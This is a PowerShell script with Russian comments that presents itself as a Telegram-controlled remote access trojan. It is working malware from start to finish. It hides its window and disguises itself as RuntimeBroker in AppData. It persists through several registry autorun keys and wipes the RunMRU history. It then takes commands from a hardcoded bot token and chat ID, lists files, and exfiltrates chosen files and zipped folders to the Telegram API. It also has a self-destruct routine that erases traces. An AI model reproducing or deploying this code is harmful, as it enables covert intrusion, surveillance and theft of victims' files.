# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # Альтернативный метод с формой
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # Резервный метод отправки файла
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # Резервный метод архивации через COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# Уникальная установка - маскировка под системный процесс
$uniqueName = "RuntimeBroker_" + (Get-Random -Minimum 1000 -Maximum 9999)
$scriptPath = "$env:APPDATA\Microsoft\Windows\NetworkCache\$uniqueName.ps1"
$batPath = "$env:APPDATA\Microsoft\Windows\NetworkCache\$uniqueName.bat"

# Создание BAT файла для запуска PowerShell скрипта
$batContent = "@echo off`npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$batContent | Out-File -FilePath $batPath -Encoding ASCII

# Копирование скрипта
$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8

# Установка в несколько мест автозагрузки
$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
    "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
)

foreach ($regPath in $regPaths) {
    try {
        if (!(Test-Path $regPath)) { 
            New-Item -Path $regPath -Force | Out-Null 
        }
        if ($regPath -like "*Windows NT*") {
            Set-ItemProperty -Path $regPath -Name "Load" -Value $batPath -Force -ErrorAction SilentlyContinue
        } else {
            Set-ItemProperty -Path $regPath -Name $uniqueName -Value $batPath -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

# Очистка истории RUN после установки
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/selfdestruct - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/selfdestruct - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size - $($item.LastWriteTime.ToString('dd.MM.yyyy HH:mm'))"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/selfdestruct$" {
                            $success = $true
                            $report = "Отчет самоуничтожения:`n"
                            
                            # 1. Удаление из автозагрузки
                            foreach ($regPath in $regPaths) {
                                try {
                                    if ($regPath -like "*Windows NT*") {
                                        Remove-ItemProperty -Path $regPath -Name "Load" -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Remove-ItemProperty -Path $regPath -Name $uniqueName -Force -ErrorAction SilentlyContinue
                                    }
                                    $report += "✓ Реестр $regPath очищен`n"
                                } catch {
                                    $success = $false
                                    $report += "✗ Ошибка очистки реестра $regPath`n"
                                }
                            }
                            
                            # 2. Очистка истории RUN
                            try {
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                $report += "✓ История RUN очищена`n"
                            } catch {
                                $success = $false
                                $report += "✗ Ошибка очистки истории RUN`n"
                            }
                            
                            # 3. Удаление файлов с задержкой и повторными попытками
                            $filesToDelete = @($scriptPath, $batPath, $MyInvocation.MyCommand.Path)
                            
                            foreach ($file in $filesToDelete) {
                                if (Test-Path $file) {
                                    for ($i = 0; $i -lt 3; $i++) {
                                        try {
                                            Remove-Item $file -Force -ErrorAction Stop
                                            if (!(Test-Path $file)) {
                                                $report += "✓ Файл $file удален`n"
                                                break
                                            }
                                        } catch {
                                            if ($i -eq 2) {
                                                $success = $false
                                                $report += "✗ Не удалось удалить $file`n"
                                            }
                                            Start-Sleep -Milliseconds 500
                                        }
                                    }
                                }
                            }
                            
                            # 4. Создание задачи для окончательной очистки при перезагрузке
                            try {
                                $cleanupScript = @"
try {
    `$files = @('$scriptPath', '$batPath', '$($MyInvocation.MyCommand.Path)')
    foreach (`$file in `$files) {
        if (Test-Path `$file) { Remove-Item `$file -Force -ErrorAction SilentlyContinue }
    }
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force -ErrorAction SilentlyContinue
} catch { }
"@
                                $cleanupPath = "$env:TEMP\cleanup.ps1"
                                $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
                                schtasks /create /tn "SystemCleanup" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" /sc once /st 23:59 /f 2>&1 | Out-Null
                                schtasks /run /tn "SystemCleanup" 2>&1 | Out-Null
                                Start-Sleep 2
                                schtasks /delete /tn "SystemCleanup" /f 2>&1 | Out-Null
                                if (Test-Path $cleanupPath) { Remove-Item $cleanupPath -Force }
                                $report += "✓ Задача очистки создана`n"
                            } catch {
                                $report += "✗ Ошибка создания задачи очистки`n"
                            }
                            
                            if ($success) {
                                $report += "`n✅ Самоуничтожение завершено УСПЕШНО. Все следы удалены."
                            } else {
                                $report += "`n⚠️ Самоуничтожение завершено с ОШИБКАМИ. Некоторые следы могли остаться."
                            }
                            
                            Send-Telegram $report
                            
                            # Завершение работы
                            exit
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
